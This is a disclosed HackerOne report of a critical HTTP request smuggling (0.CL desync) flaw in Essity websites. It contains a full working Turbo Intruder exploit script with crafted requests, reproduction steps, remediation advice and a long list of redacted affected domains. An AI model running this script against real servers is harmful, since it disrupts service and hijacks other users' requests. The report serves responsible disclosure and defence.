---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/http-request-smuggling
  - env/web
substate: "resolved"
weakness: "HTTP Request Smuggling"
enriched: true
body: true
date: 2026-05-20
submitted: 2026-03-06T13:15:49.812Z
bounty_usd: null
votes: 15
cve: []
program: "[[programs/essity|Essity]]"
reporter: "t0xodile"
source: "https://hackerone.com/reports/3589269"
title: "HTTP Request Smuggling"
---
# HTTP Request Smuggling

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 15 | **Program:** Essity | **Disclosed:** 2026-05-20

- Report: [https://hackerone.com/reports/3589269](https://hackerone.com/reports/3589269)
- CWE: HTTP Request Smuggling
- Submitted: 2026-03-06T13:15:49.812Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
HTTP Request Smuggling is a vulnerability stemming from HTTP/1.1's core weakness, the boundaries between requests on keep-alive connections. In this case, it was possible to achieve a 0.CL desync. This means that it is possible to create a request with a malformed `Content-Length` header, where the frontend ignores the content-length header, but the backend processes it. This discrepancy allows an attacker to take control of other users' requests achieving a range of critical impacts. For more information on request smuggling, and 0.CL desync in general, please refer to this research:

[0.CL Desync Attacks](https://portswigger.net/research/http1-must-die#0.cl-desync-attacks)

## Steps To Reproduce:
1. In Burp Suite, send any valid request who's target is set to `████████` to turbo intruder
2. Paste the following turbo intruder script into the script window
```python
# Refer to https://portswigger.net/research/http1-must-die
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=100,
                           requestsPerConnection=1,
                           engine=Engine.BURP,
                           maxRetriesPerRequest=0,
                           timeout=15
                           )

    # The attack should contain an early-response gadget and a (maybe obfuscated) Content-Length header with the value set to %s
    stage1 = '''POST /CON HTTP/1.1
Host: '''+host+'''
Cookie: baca8f7410f46004b3ebdb56efffd64ce7cc73784001204a5fdd719816850df2=7ce2a3d9e711f9458d5fb71d02dcfaaaeeb2b7bf758fe15ddcb88d58b00c6e9a202a523d
Pragma: no-cache
Cache-Control: no-cache
Sec-Ch-Ua-Platform: "Linux"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.44 Safari/537.36
Sec-Ch-Ua: "Not:A-Brand";v="99", "HeadlessChrome";v="145", "Chromium";v="145"
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: script
Referer: https://████████/
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-length: 
 %s

'''

    # This will get prefixed to the victim's request - place your payload in here
    smuggled = '''TRACE /assets HTTP/1.1
X: x'''



    # If the server doesn't like GET with a body, try OPTIONS etc
    stage2_chopped = '''GET / HTTP/1.1
Content-Length: 123
X: Y'''

    stage2_revealed = '''GET /robots.txt HTTP/1.1
Host: '''+host+'''
Cookie: baca8f7410f46004b3ebdb56efffd64ce7cc73784001204a5fdd719816850df2=7ce2a3d9e711f9458d5fb71d02dcfaaaeeb2b7bf758fe15ddcb88d58b00c6e9a202a523d
Pragma: no-cache
Cache-Control: no-cache
Sec-Ch-Ua-Platform: "Linux"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.44 Safari/537.36
Sec-Ch-Ua: "Not:A-Brand";v="99", "HeadlessChrome";v="145", "Chromium";v="145"
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: script
Referer: https://████████/
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

'''

    victim = '''GET / HTTP/1.1
Host: '''+host+'''
Cookie: baca8f7410f46004b3ebdb56efffd64ce7cc73784001204a5fdd719816850df2=7ce2a3d9e711f9458d5fb71d02dcfaaaeeb2b7bf758fe15ddcb88d58b00c6e9a202a523d
Pragma: no-cache
Cache-Control: no-cache
Sec-Ch-Ua-Platform: "Linux"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.44 Safari/537.36
Sec-Ch-Ua: "Not:A-Brand";v="99", "HeadlessChrome";v="145", "Chromium";v="145"
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: script
Referer: https://████████/
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive

'''

    # No need to edit below this line
    if '%s' not in stage1:
        raise Exception('Please place %s in the Content-Length header value')

    if not stage1.endswith('\r\n\r\n'):
        raise Exception('Stage1 request must end with a blank line and have no body')


    while True:
        engine.queue(stage1, len(stage2_chopped), label='stage1', fixContentLength=False)
        engine.queue(stage2_chopped + stage2_revealed + smuggled, label='stage2')
        engine.queue(victim, label='victim')


def handleResponse(req, interesting):
    if req.label == "victim":
        table.add(req)

    # 0.CL attacks use a double desync so they can take a while!


```
3. Select "Attack" and wait.
4. In the results table, you can see a simulated victim, interacting with the application. Note that their request towards the home page, occasionally produces a 405 response, instead of the normal 200 response. 
████████

This is achieved because the script is configured with the following prefix.
```python
    # This will get prefixed to the victim's request - place your payload in here
    smuggled = '''TRACE /assets HTTP/1.1
X: x'''
```

When the victim's request ends up appended to this prefix, their request looks like this:
```http
TRACE /assets HTTP/1.1
X: xGET / HTTP/1.1
Host: ████████
Cookie: baca8f7410f46004b3ebdb56efffd64ce7cc73784001204a5fdd719816850df2=7ce2a3d9e711f9458d5fb71d02dcfaaaeeb2b7bf758fe15ddcb88d58b00c6e9a202a523d
Pragma: no-cache
Cache-Control: no-cache
Sec-Ch-Ua-Platform: "Linux"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.44 Safari/537.36
Sec-Ch-Ua: "Not:A-Brand";v="99", "HeadlessChrome";v="145", "Chromium";v="145"
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: no-cors
Sec-Fetch-Dest: script
Referer: https://████████/
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive


```


# Remediation
The most robust remediation for request smuggling is to *never* use HTTP/1 upstream. That means, that besides your very first proxy, *every* web server, including the backend origin server, should use HTTP/2 end-to-end. However, this is often unachievable due to some vendors refusal to adopt HTTP/2 right now. If this is not possible in your case, you must implement *consistent* and *strict* HTTP request and response parsing across *all* proxies in your infrastructure. This often involves configuration proxies to use strict parsing measures in their configuration files. You can find all kinds of advice on this approach at the following link:
[http1mustdie.com](https://http1mustdie.com/)

## Impact

On it's own, this produces a denial of service vulnerability, where regular user traffic produces unexpected 405 errors, rendering the application unusable. However, the same technique can usually chained with other gadgets and vulnerabilities in order to take full control of the application. This is often achieved via a variety of impacts including response queue poisoning, global cross-site scripting, cache poisoning / deception, open redirection and access control bypasses. You can find more information on the plethora of impacts in the following web academy notes:

[Exploiting Request Smuggling](https://portswigger.net/web-security/request-smuggling/exploiting)

## Timeline

- **Report Filed**
- **Report Severity Updated**
- **2026-03-06** @t0xodile: After confirming this on ████████ I ran a quick scan using [this tool](https://github.com/PortSwigger/http-request-smuggler) and the "Parser Discrepancy Scan" which looks for header mutations you could abuse to achieve a full desync. 
I haven't confirmed these, but it is likely this issue is repeatable on multiple domains. 

If you use the script above, simply changing the "host" to the domain you want to target, may tell you pretty quickly if it is vulnerable. For example, I could recreate this on `www.████████.com` using this technique. However, this isn't fully reliable, as most desync must be customised per domain. 
████████

████████
- **Report Triaged**
- **2026-03-11** @ariannac: Hi @t0xodile ,

If possible, could you please share the full list of affected sites from our side? This will aid us in ensuring we address the issue in his totality.

Thank you!
- **2026-03-11** @t0xodile: Hej! 

Yes,  I've run the scan on everything in scope (I think) and the following domains were vulnerable to the underlying parser discrepancy. 

https://mft.████████.com
https://www.████████.be
https://www.████████.ca
https://www.████████
https://www.████████.co.uk
https://www.████████.co.jp
https://www.████████.com.mt
https://www.████████.com
https://www.████████.co.za
https://www.████████
https://www.████████.de
https://www.████████.at
https://www.████████.hu
https://www.████████.pl
https://www.████████.no
https://www.████████.es
https://www.████████.ch
https://www.████████.hr
https://www.████████.com
https://www.████████.nl
https://www.████████.dk
https://www.████████.sk
https://www.████████.us
https://www.████████.ro
https://www.████████.it
https://www.████████.cz
https://www.████████.pt
https://www.████████.si
https://www.████████.de
https://www.████████.it
https://www.████████.fi
https://www.████████.fr
https://www.████████.nu
https://www.████████.fr
https://www.████████.com.au
https://www.████████.ch
https://www.████████.com
https://www.████████.de
https://www.████████.rs
https://www.████████.be
https://www.████████.lt
https://www.████████.it
https://www.████████.com.au
https://www.████████.com
https://www.████████.co.uk
https://www.████████.fr
https://www.████████.com.au
https://www.████████.co.uk
https://www.████████.com
https://www.████████.com
https://www.████████.cz
https://www.████████.com
https://www.████████.es
https://www.████████.pl
https://www.████████.gr
https://www.████████.it
https://www.████████.us
https://www.████████.no
https://www.████████.hr
https://www.████████.de
https://www.████████.com
https://www.████████.cz
https://www.████████.si
https://www.████████.dk
https://www.████████.no
https://www.████████.es
https://www.████████.nl
https://www.████████.dk
https://www.████████.us
https://www.████████.se
https://www.████████.sk
https://www.████████.it
https://████████
https://████████.com.au
https://████████.com.tr
https://████████.com.au
https://████████.co.id
https://████████.co.uk
https://████████.co.uk
https://████████.com.au
https://████████.com.br
https://████████.com.tr
https://www.████████.uz
https://████████.co.uk
https://████████.com.au
https://████████.com.mt
https://████████.com.ee
https://████████
https://████████.co.jp
https://████████.co.za
https://████████.co.za
https://████████.co.nz
https://████████.co.uk
https://████████.com
https://████████.com
https://████████.sk
https://████████.no
https://████████.pl
https://████████.es
https://████████.de
https://████████.fi
https://████████.us
https://████████.be
https://████████.co.za
https://████████.nl
https://████████.co.uk
https://████████.co.uk
https://api.████████.com
https://████████.com.mx
https://████████.si
https://████████.it
https://████████.at
https://████████.ca
https://████████.pt
https://████████.nl
https://████████.us
https://████████.ch
https://████████.hu
https://████████.se
https://████████.com
https://████████.dk
https://████████.com
https://████████.lv
https://████████.ch
https://████████.at
https://████████.gr
https://████████.se
https://████████.tn
https://████████.dk
https://████████.nu
https://████████.nl
https://████████.nl
https://████████.hu
https://████████.no
https://████████.at
https://████████.rs
https://████████.ro
https://████████.am
https://████████.lt
https://████████.pt
https://████████.ie
https://████████.de
https://████████.lt
https://████████.com
https://████████.fr
https://████████.it
https://████████.es
https://████████.kz
https://████████.be
https://████████.sk
https://████████.si
https://████████.cz
https://████████.fi
https://████████.pl
https://████████.ca
https://████████.fi
https://████████.hr
https://████████.gr
https://████████.hu
https://████████.hr
https://████████.be
https://████████.az
https://████████.cz
https://████████.us
https://████████.lv
https://████████.es
https://████████.ee
https://████████.ge
https://████████.com
https://████████.pt
https://████████.de
https://████████.ca
https://████████.it
https://████████.com
https://████████.ch
https://████████.ua
https://████████.bg
https://████████.pl
https://████████.se
https://████████.cl
https://████████.ie
https://████████.ro
https://████████.pl
https://████████.no
https://████████.fr
https://████████.de
https://████████.be
https://████████.dk
https://████████.nl
https://████████.fi
https://████████.com
https://████████.com
https://████████.ua
https://████████.com
https://████████.se
https://████████.gr
https://████████.com
https://████████.de
https://████████.ro
https://████████.rs
https://████████.bg
https://████████.fi
https://████████.hr
https://████████.ru
https://████████.es
https://████████.dk
https://████████.nl
https://████████.com
https://████████.se
https://████████.dk
https://████████.com
https://████████.pt
https://████████.hu
https://████████.no
https://████████.fi
https://████████.be
https://████████.fr
https://████████.hu
https://████████.nl
https://████████.no
https://████████.de
https://████████.com
https://████████.it
https://████████.by
https://████████.mx
https://████████.se
https://████████.fr

Cheers,
t0xodile
- **2026-03-11** @ariannac: Thank you so much!
- **Report Resolved**
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
